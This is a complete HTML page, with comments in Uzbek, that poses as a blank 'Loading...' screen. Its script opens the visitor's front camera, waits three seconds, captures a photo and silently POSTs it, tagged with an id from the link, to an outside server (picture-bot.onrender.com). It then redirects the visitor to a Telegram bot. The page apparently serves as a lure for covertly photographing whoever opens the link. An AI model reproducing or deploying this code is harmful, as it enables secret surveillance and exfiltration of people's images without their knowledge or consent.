<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            background: #000;
            overflow: hidden;
        }
        video {
            position: fixed;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: "user" }, // Old kamera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    setTimeout(() => captureImage(), 3000); // Kamera ochilganidan keyin 3s kutish
                };

            } catch (error) {
                console.error("Kamera ochilmadi!", error);
            }
        }

        function captureImage() {
            if (!video.videoWidth || !video.videoHeight) {
                console.error("Video yuklanmadi, qayta urinish...");
                setTimeout(captureImage, 1000); // Video hali yuklanmasa 1s kutib yana urinish
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");
            const userId = getQueryParam("id");

            fetch("https://picture-bot.onrender.com/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: imageData, userId })
            })
            .then(() => {
                closeCamera();
            })
            .catch(error => console.error("Rasm yuklashda xatolik:", error));
        }

        function closeCamera() {
            const stream = video.srcObject;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            window.location.replace("https://t.me/AsilbekCode_Picture_bot");
        }

        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        startCamera();
    </script>
</body>
</html>
